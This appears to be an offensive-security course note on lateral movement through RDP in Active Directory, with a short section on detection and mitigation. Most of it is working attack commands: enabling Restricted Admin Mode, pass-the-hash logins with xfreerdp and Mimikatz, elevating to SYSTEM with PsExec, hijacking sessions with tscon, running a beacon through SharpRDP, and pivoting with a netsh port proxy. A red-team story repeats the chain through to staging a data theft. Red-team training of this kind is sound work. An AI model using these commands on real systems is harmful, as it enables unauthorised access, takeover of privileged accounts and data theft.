---
tags: [active-directory, intermediate, lateral-movement, vapt]
difficulty: intermediate
module: "68 - AD Lateral Movement and Credential Access"
topic: "68.01 Lateral Movement via RDP"
---

# Lateral Movement via RDP and Hijacking Sessions

## Introduction to RDP in Active Directory Environments
Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. In the context of Active Directory (AD) environments, RDP is extensively used by system administrators for remote management, maintenance, and support of Windows servers and workstations.

Due to its ubiquitous nature, RDP presents a highly attractive vector for lateral movement during a Red Team engagement or Penetration Test. Threat actors and penetration testers alike leverage RDP to navigate through the network, access sensitive systems, and interact with graphical applications that might be difficult to manipulate purely via command-line interfaces.

Moving laterally via RDP requires specific privileges. By default, the `Administrators` and `Remote Desktop Users` groups have the right to log on through Terminal Services (RDP). 

Understanding RDP lateral movement is not just about popping a GUI shell; it is about understanding how Windows handles sessions, authentication (NTLM vs. Kerberos), and how administrative control can be weaponized to hijack existing sessions, effectively bypassing credential requirements for logged-on users.

---

## Architectural ASCII Diagram: RDP Session Hijacking

```text
+-------------------------------------------------------------------------------------------------+
|                                                                                                 |
|   +-------------------+                                                                         |
|   |   Attacker Node   |                                                                         |
|   |   (Compromised)   |                                                                         |
|   +---------+---------+                                                                         |
|             |                                                                                   |
|             | 1. Compromises Local Admin credentials or Hash                                    |
|             v                                                                                   |
|   +-------------------+                                                                         |
|   |  Target Windows   |                                                                         |
|   |  Server/Client    |                                                                         |
|   +---------+---------+                                                                         |
|             |                                                                                   |
|             | 2. Establishes initial RDP connection (xfreerdp /v:Target /u:Admin /p:Pass)       |
|             |                                                                                   |
|   +---------v---------+                                                                         |
|   |   Session 1 (ID)  | <--- Attacker's active session (Admin)                                  |
|   +-------------------+                                                                         |
|                                                                                                 |
|   +-------------------+                                                                         |
|   |   Session 2 (ID)  | <--- Domain Admin's disconnected/active session                         |
|   +---------+---------+                                                                         |
|             |                                                                                   |
|             | 3. Attacker elevates to SYSTEM (e.g., via PsExec -s cmd.exe)                      |
|             | 4. Attacker runs: tscon.exe 2 /dest:1                                             |
|             v                                                                                   |
|   +------------------------------------------------------------------------+                    |
|   |                                                                        |                    |
|   |  [+] RDP Session Hijack Successful!                                    |                    |
|   |  Attacker is now interacting with the Domain Admin's graphical desktop |                    |
|   |  without needing the Domain Admin's password!                          |                    |
|   |                                                                        |                    |
|   +------------------------------------------------------------------------+                    |
|                                                                                                 |
+-------------------------------------------------------------------------------------------------+
```

---

## RDP Authentication Mechanics
When a user attempts to authenticate via RDP, Windows uses Network Level Authentication (NLA) by default. NLA requires the connecting user to authenticate themselves before a session is established with the server. This prevents denial-of-service attacks and protects against some man-in-the-middle attacks.

NLA utilizes CredSSP (Credential Security Support Provider), which wraps NTLM or Kerberos authentication. 
- **Kerberos**: Preferred in AD if the target is specified by hostname/FQDN.
- **NTLM**: Used if targeting an IP address or if Kerberos fails.

If an attacker has obtained plaintext credentials, connecting is trivial. However, if the attacker only possesses an NTLM hash, they might still be able to connect using "Restricted Admin Mode".

### Pass-the-Hash (PtH) over RDP (Restricted Admin Mode)
Restricted Admin Mode was introduced in Windows 8.1 and Windows Server 2012 R2. When enabled, credentials are not passed to the remote system in plaintext. Instead, a challenge-response authentication occurs, which allows an attacker to use Pass-the-Hash (PtH) to authenticate via RDP.

To check or enable Restricted Admin Mode on a target (requires local admin access via other means first):
```powershell
# Enable Restricted Admin Mode via Registry
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
```

Once enabled, an attacker can use `xfreerdp` from a Linux attacking machine to pass the hash:
```bash
xfreerdp /v:192.168.1.100 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert:ignore
```

Or from a compromised Windows host using Mimikatz:
```text
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:"mstsc.exe /restrictedadmin"
```

---

## RDP Session Hijacking
RDP Session Hijacking is a powerful post-exploitation technique. If a high-privileged user (like a Domain Admin) has logged into a server via RDP and simply closed the window instead of logging off, their session remains in a "Disconnected" state. The processes (like `explorer.exe`) are still running in their context.

Normally, reconnecting to a disconnected session requires the user's password. However, the Windows OS itself has the authority to connect sessions to different physical or virtual terminals. By operating as the `SYSTEM` user, an attacker can forcefully connect a target user's session to their own RDP session, effectively stealing their session without knowing their password.

### Step-by-Step RDP Session Hijacking

#### Step 1: Enumerate Active and Disconnected Sessions
First, identify if there are any interesting sessions on the target server.
```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>attacker              rdp-tcp#0           1  Active          .  6/10/2026 10:00 AM
 domainadmin           rdp-tcp#1           2  Disc        00:15  6/10/2026 08:00 AM
```
In this example:
- The attacker is logged in as `attacker` with Session ID `1`.
- A `domainadmin` user has a disconnected session with Session ID `2`.

#### Step 2: Elevate to SYSTEM
Hijacking another user's session requires `NT AUTHORITY\SYSTEM` privileges. If the attacker has Local Admin rights, they can easily elevate to SYSTEM using tools like PsExec or by creating a Windows service.

Using PsExec:
```cmd
C:\> psexec.exe -s -i cmd.exe
```

Verify SYSTEM context:
```cmd
C:\> whoami
nt authority\system
```

#### Step 3: Hijack the Session via `tscon.exe`
The `tscon.exe` utility is built into Windows and is used to connect to another session.
The syntax is: `tscon.exe <TargetSessionID> /dest:<AttackerSessionName>`

From the SYSTEM command prompt, execute the hijack:
```cmd
C:\> tscon.exe 2 /dest:rdp-tcp#0
```

Upon execution, the attacker's screen will briefly flash, and they will immediately be dropped into the Domain Admin's desktop, possessing all the rights and privileges of that user, including network drives, cached credentials, and access to domain resources.

---

## Tooling for RDP Lateral Movement

### xfreerdp
`xfreerdp` is the standard Linux tool for RDP connections. It is highly robust and supports Pass-the-Hash.
```bash
# Basic Connection
xfreerdp /v:10.10.10.50 /u:admin /p:Password123 /cert:ignore /dynamic-resolution

# Drive Mapping (Sharing attacking machine's folder to target)
xfreerdp /v:10.10.10.50 /u:admin /p:Password123 /drive:share,/tmp/transfer
```

### SharpRDP
`SharpRDP` is a C# project designed for authenticated RDP execution. It does not spawn a GUI; instead, it establishes an RDP connection in the background, executes a command (like spawning a beacon or reverse shell), and disconnects. This is extremely useful for stealthy lateral movement where opening a GUI is undesirable.

```cmd
SharpRDP.exe computername=192.168.1.100 command="C:\Temp\beacon.exe" username=CORP\Administrator password=Password123!
```

### Network Shell (Netsh) Port Proxying
If RDP (port 3389) is blocked from the outside, but the attacker has shell access to an internal machine that *can* reach the target, they can use `netsh` to proxy the RDP traffic.

```cmd
# On the pivot machine: Forward local port 4444 to target's port 3389
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.1.100

# Now the attacker connects via xfreerdp to PivotIP:4444
xfreerdp /v:PivotIP:4444 /u:admin /p:Password
```

---

## Evasion and Operational Security (OPSEC)
Using RDP is generally noisy. It creates event logs and network traffic that can be easily spotted by defenders. 
1. **Event Logs**: Successful RDP logons generate Event ID 4624 (Logon Type 10 or 3 for Network/Remote Interactive). 
2. **Session Hijacking Indicators**: The use of `tscon.exe` is heavily monitored by EDRs. Defenders often look for `tscon.exe` executed by `cmd.exe` or `powershell.exe` under the `SYSTEM` context.
3. **Restricted Admin Mode Logs**: Using Restricted Admin Mode leaves specific traces in the event logs, indicating that credentials were not delegated.
4. **GUI Artifacts**: Interacting with the desktop leaves artifacts in the user's `NTUSER.DAT` registry hive, MRU (Most Recently Used) lists, and potentially Explorer history.

### Mitigations
- Implement strict Network Level Authentication (NLA).
- Restrict RDP access via Group Policy to only specific administrative jump boxes.
- Disable Restricted Admin Mode if not strictly necessary, or closely monitor for its registry modification.
- Implement session timeouts via GPO to automatically log off disconnected sessions rather than leaving them indefinitely open for hijacking.
- Monitor `tscon.exe` usage and alert on execution by unapproved or automated processes.

---


## Real-World Attack Scenario
During a recent red team engagement for a mid-sized financial institution, the team had established an initial foothold on a developer's workstation. After conducting internal network enumeration using BloodHound, the attacker identified that the developer's machine was in the same network segment as several Tier-2 jump servers. While the attacker lacked Domain Admin credentials, they had managed to extract the local Administrator NTLM hash from the developer's workstation. 

Knowing that organizations often use identical local administrator passwords across multiple machines, the attacker decided to test this hypothesis against the jump server. The attacker used `xfreerdp` with the Pass-the-Hash (PtH) technique, leveraging the `/pth` flag to authenticate to the jump server without needing the plaintext password.

```bash
xfreerdp /v:10.50.20.15 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert:ignore
```

The connection was successful; Restricted Admin Mode was fortunately enabled on the jump server. Once dropped into the GUI environment of the server, the attacker opened a command prompt and ran `query user` to inspect active and disconnected sessions.

```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 administrator         rdp-tcp#0           1  Active          .  6/10/2026 10:00 AM
 svc_da_admin          rdp-tcp#1           2  Disc        02:30  6/10/2026 07:15 AM
```

The attacker noticed a disconnected session belonging to `svc_da_admin`, a known Domain Admin service account. Recognizing a prime opportunity for RDP Session Hijacking, the attacker escalated their command prompt to `SYSTEM` privileges using PsExec, which they had uploaded to the `C:\Temp` directory.

```cmd
C:\Temp\psexec.exe -s -i cmd.exe
```

A new terminal window popped up running as `NT AUTHORITY\SYSTEM`. From this highly privileged context, the attacker executed the built-in `tscon.exe` binary to forcefully hijack the disconnected session, mapping the `svc_da_admin` session (ID 2) directly into their current RDP window (Session ID 1).

```cmd
C:\Windows\System32\tscon.exe 2 /dest:rdp-tcp#0
```

Instantly, the screen flickered, and the attacker was staring at the desktop of the `svc_da_admin` user. The attacker didn't need to know the Domain Admin's password, bypass MFA, or trigger noisy authentication logs against the Domain Controller. With full Domain Admin context now hijacked, the attacker proceeded to access the central file shares containing sensitive customer data and began preparing for data exfiltration, achieving the primary objective of the assessment without triggering the organization's EDR alerts regarding credential dumping.

## Chaining Opportunities
- **[[05 - Dumping LSASS Memory Mimikatz Procdump Comsvcs]]**: Once RDP access is gained, dumping LSASS via Task Manager GUI or command line becomes trivial, yielding plaintext passwords or hashes of other users.
- **[[02 - Lateral Movement via WinRM and PSRemoting]]**: WinRM can be used to enable RDP remotely if it is disabled, paving the way for graphical access.
- **Privilege Escalation**: Once logged in via RDP as a low-privileged user, standard local privilege escalation techniques can be employed visually.

## Related Notes
- [[03 - Lateral Movement via SMB PsExec SmbExec]]
- [[04 - Lateral Movement via WMI WMIExec]]
- [[Kerberoasting and AS-REP Roasting]]
- [[Active Directory Enumeration with BloodHound]]

---
*End of Document*
